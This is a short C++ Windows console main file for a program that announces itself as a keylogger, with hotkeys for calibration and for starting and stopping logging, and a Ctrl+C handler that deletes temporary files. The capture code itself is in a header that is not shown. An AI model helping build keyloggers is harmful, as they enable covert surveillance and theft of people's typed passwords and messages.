#define _CRT_SECURE_NO_WARNINGS
#include "Program.h"

BOOL WINAPI consoleHandler(DWORD signal) {

	if (signal == CTRL_C_EVENT) {
		Program programm;
		if (programm.deleteFile() < 1) {
			cout << "ERROR: Failed to clear data." << endl;
			MessageBeep(MB_ICONERROR);
			return FALSE;
		}
		cout << "Temporary files have been cleared." << endl;
	}

	return FALSE;
}
int main()
{
	Program programm;
	if (!SetConsoleCtrlHandler(consoleHandler, TRUE)) {
		printf("\nERROR: Could not set control handler.");
		return 0;
	}
	cout << "Key logger working!" << endl;
	cout << "CTRL + 1 for calibration." << endl;
	cout << "CTRL + 2 for switch start / stop logging." << endl;
	cout << "CTRL + 7 exit." << endl;
	programm.start();
	programm.deleteFile();
	return 0;
}
